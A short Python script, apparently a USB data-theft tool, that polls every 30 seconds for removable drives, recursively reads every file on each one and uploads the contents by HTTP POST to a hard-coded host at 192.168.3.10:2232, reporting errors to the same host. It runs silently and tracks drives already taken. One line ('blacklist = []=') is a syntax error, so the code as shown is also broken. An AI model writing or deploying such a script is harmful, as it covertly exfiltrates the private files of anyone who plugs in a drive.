import psutil
import os
import time
import requests


def get_volume_label(drive_letter):
    """通过盘符获取卷标"""
    t = time.strftime('%Y-%m-%d, %H:%M:%S', time.localtime(time.time()))
    command = "wmic VOLUME GET Label,Caption"
    data = os.popen(command).read().split("\n")
    for i in data[1:]:
        if drive_letter.upper() in i.split('\\')[0]:
            n = i.split('\\')[-1].replace(' ', '')
            return '无名氏：' + t if n == '' else n
    return '没这个盘符：' + t


def digui(fuhao, mingzi=None):
    x = []
    for i in os.listdir(fuhao):
        if os.path.isfile(fuhao + i):
            if 'System Volume Information' not in fuhao + i:
                x.append(fuhao + i)
        else:
            x += digui(fuhao + i + '\\')
    if not mingzi is None:
        x = [[i, i.replace(fuhao, 'file\\' + mingzi + '\\')] for i in x]  # [*x]
    return x


# print(a)
# exit()
blacklist = []=
host = 'http://192.168.3.10:2232'
if __name__ == '__main__':
    while 1:
        for i in [[i.device, get_volume_label(i.device[0])] for i in psutil.disk_partitions() if i.opts == 'rw,removable']:
            print(i[1], blacklist)
            if i[1] in blacklist:
                continue
            f = digui(*i)
            for ii in f:
                try:
                    try:
                        file = str(open(ii[0], 'rb').read())
                        # requests.post(host, json={'path': i[1], 'file': "b''"})
                    except Exception as e:
                        requests.get(host + '/?e=' + str(e))
                        continue
                    requests.post(host, json={'path': ii[1], 'file': file})
                except:
                    pass
            blacklist.append(i[1])
        time.sleep(30)
